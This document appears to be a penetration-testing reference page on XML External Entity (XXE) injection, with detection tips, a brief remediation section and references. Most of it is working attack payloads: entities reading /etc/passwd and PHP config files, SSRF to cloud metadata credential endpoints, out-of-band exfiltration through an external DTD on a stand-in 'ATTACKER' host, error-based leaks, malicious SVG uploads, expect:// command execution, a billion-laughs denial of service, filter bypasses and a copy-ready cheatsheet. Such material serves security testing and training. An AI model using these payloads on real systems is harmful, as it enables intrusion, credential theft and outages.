# XML External Entity (XXE) Injection

XXE abuses an XML parser configured to resolve **external entities**. By defining a DOCTYPE with a custom entity that points at a local file or remote URL, an attacker reads files, performs SSRF, exfiltrates data out-of-band, and sometimes achieves RCE. Part of OWASP A05:2021 (Security Misconfiguration). Still pervasive in SOAP, SAML, SVG/Office/RSS uploads, and any XML API.

---

## Impact

- **Arbitrary file read** (`/etc/passwd`, source, secrets, `web.config`).
- **SSRF** — reach internal services / cloud metadata via entity URLs.
- **OOB data exfiltration** & **blind** XXE via parameter entities.
- **DoS** (billion laughs / quadratic blowup).
- **RCE** in specific stacks (PHP `expect://`, certain Java/`jar:` setups).

---

## Detection

Any endpoint that accepts XML — even if the Content-Type is JSON, try switching it to XML:

```text
- SOAP / WSDL services
- REST APIs (resend as application/xml)
- File uploads: .xml, .svg, .docx/.xlsx/.pptx (OOXML), .xlf, .gpx, .rss, .xsd, .xsl, .dtd, .pdf(xfa), .plist
- SAML responses, XML-RPC, RSS/Atom importers, sitemap parsers
```

```http
# Flip JSON to XML on an API
POST /api/import HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?><root><name>test</name></root>
```

Probe by referencing a benign entity and watching for resolution; confirm blind cases with an OOB collaborator.

---

## Exploitation

### 1. In-band file read (classic)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

Place `&xxe;` where a value gets reflected back in the response. Windows: `file:///c:/windows/win.ini`.

### 2. SSRF via XXE

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

### 3. PHP wrapper file read (base64 — beats XML-illegal chars)

If raw file content breaks the XML (e.g. has `<`/`&`), base64 it via `php://filter`:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM
  "php://filter/convert.base64-encode/resource=/var/www/html/config.php"> ]>
<root>&xxe;</root>
```

### 4. Blind / Out-of-Band (parameter entities + external DTD)

When nothing is reflected, exfiltrate via an attacker-hosted DTD using **parameter entities** (`%`):

`evil.dtd` on your server:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/x?d=%file;'>">
%eval;
%exfil;
```

Payload sent to the target:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd"> %xxe; ]>
<foo>bar</foo>
```

The file content arrives base64-encoded in your web log query string. (Local-only DTDs can't redefine entities inside the internal subset — that's why the second-stage DTD is external.)

### 5. Error-based blind (no OOB egress)

Force the parser to leak file contents inside an error message:

`evil.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser throws "file not found: /nonexistent/root:x:0:0:..." revealing the file.

### 6. XInclude (when you don't control the DOCTYPE)

If you can only inject into a sub-element of a server-built XML doc:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### 7. XXE via file upload (SVG / OOXML)

```xml
<!-- malicious.svg -->
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60">
  <text x="0" y="20">&xxe;</text>
</svg>
```

OOXML (docx/xlsx) are ZIPs of XML — inject into `word/document.xml` / `[Content_Types].xml`, re-zip, upload.

### 8. RCE via `expect://` (PHP with expect ext loaded)

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>
<root>&xxe;</root>
```

### 9. Billion Laughs (DoS — use with care)

```xml
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 ... up to lol9 ]>
<lolz>&lol9;</lolz>
```

---

## Bypasses

- **DOCTYPE filtered**: use UTF-16 / UTF-7 encoding of the payload (declare `encoding="UTF-16"` and send the BOM-prefixed bytes) to slip past naive string filters.
- **`SYSTEM` blocked**: use `PUBLIC "id" "url"`.
- **No external entities but parser still resolves params**: rely on the parameter-entity OOB technique.
- **WAF on `file:///`**: try `netdoc:/`, `jar:file://`, `php://filter`, or `file:/` (one slash).

```xml
<!-- UTF-7 / UTF-16 wrapping, PUBLIC variant -->
<!DOCTYPE r [ <!ENTITY xxe PUBLIC "x" "file:///etc/passwd"> ]>
```

---

## Tooling

| Tool | Use |
|------|-----|
| **Burp Suite** (scanner + manual Repeater) | Detect/exploit; auto-generates OOB DTD via Collaborator |
| **XXEinjector** | Automate file-read, OOB, brute path enumeration |
| **oxml_xxe** | Inject XXE into docx/xlsx/svg/etc. |
| **interactsh / Collaborator** | OOB blind exfil + error-based |
| **docem** | Embed payloads in office docs |

```bash
ruby XXEinjector.rb --host=ATTACKER --httpport=8888 --file=request.txt --path=/etc --oob=http
```

---

## Remediation

- **Disable DTDs / external entities** entirely in the parser (the only robust fix):
  - Java: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);` and disable external general/parameter entities.
  - PHP (libxml < 2.9): `libxml_disable_entity_loader(true);` (default-safe ≥ 2.9).
  - .NET: `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit;`
  - Python: use `defusedxml` instead of stdlib parsers.
- Disable XInclude; reject `<!DOCTYPE` in input where DTDs aren't needed.
- Use less-complex data formats (JSON) where possible.

---

## Cheatsheet

```text
# File read (in-band)
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> ... &xxe;
# SSRF
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
# PHP base64 read
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
# OOB (external DTD, parameter entities)
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd"> %xxe;]>
# XInclude (no DOCTYPE control)
<xi:include parse="text" href="file:///etc/passwd" xmlns:xi=".../XInclude"/>
# SVG upload entity
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]> ... &xxe;
# PHP RCE
<!ENTITY xxe SYSTEM "expect://id">
```

---

## References

- PortSwigger — XXE: https://portswigger.net/web-security/xxe
- PortSwigger — Blind XXE: https://portswigger.net/web-security/xxe/blind
- PayloadsAllTheThings — XXE: https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/
- HackTricks — XXE: https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html
- OWASP XXE Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- XXEinjector: https://github.com/enjoiz/XXEinjector
